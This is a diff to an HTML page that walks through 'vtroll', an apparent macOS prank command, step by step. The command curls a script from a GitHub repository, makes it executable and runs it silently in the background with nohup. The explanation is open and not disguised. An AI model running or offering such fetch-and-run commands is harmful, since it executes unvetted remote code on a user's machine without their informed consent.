@@ -9,11 +9,12 @@
       <h1>An in-depth view of vtroll</h1>
       What does the command do? Let's break it down.<br />
       <code>curl "https://raw.githubusercontent.com/itrolledu/itrolledu.github.io/master/mac/vtroll/dl" -o "trolling"; tr -d '\r' < trolling >trollingnl; chmod +x ./trollingnl; rm -rf trolling; nohup sh -c '$PWD/trollingnl' &</code>
+      <hr />
       <h2>curl "https://raw.githubusercontent.com/itrolledu/itrolledu.github.io/master/mac/vtroll/dl" -o "trolling";</h2>
-      This is the first part. It downloads the file <a href="https://raw.githubusercontent.com/itrolledu/itrolledu.github.io/master/mac/vtroll/dl">https://raw.githubusercontent.com/itrolledu/itrolledu.github.io/master/mac/vtroll/dl</a> as troll on the filesystem.<br />
+      This is the first part. It downloads the file <a href="https://raw.githubusercontent.com/itrolledu/itrolledu.github.io/master/mac/vtroll/dl">https://raw.githubusercontent.com/itrolledu/itrolledu.github.io/master/mac/vtroll/dl</a> as <i>trolling</i> on the filesystem.<br />
       <h2>tr -d '\r' < trolling >trollingnl;</h2>
       While creating the script, occasionally, the line endings would act weird and not allow the script to run. In order to fix this, we strip any possible DOS newlines, to make it unix/linux/mac safe.<br />
-      It takes the contents of the downloaded file <i>troll</i> and save the NewLine version into <i>trollnl</i>
+      It takes the contents of the downloaded file <i>trolling</i> and save the NewLine version into <i>trollingnl</i>
       <h2>chmod +x ./trollingnl;</h2>
       This makes the script runnable/executable (setting the eXecutable bit to true).
       <h2>rm -rf trolling;</h2>
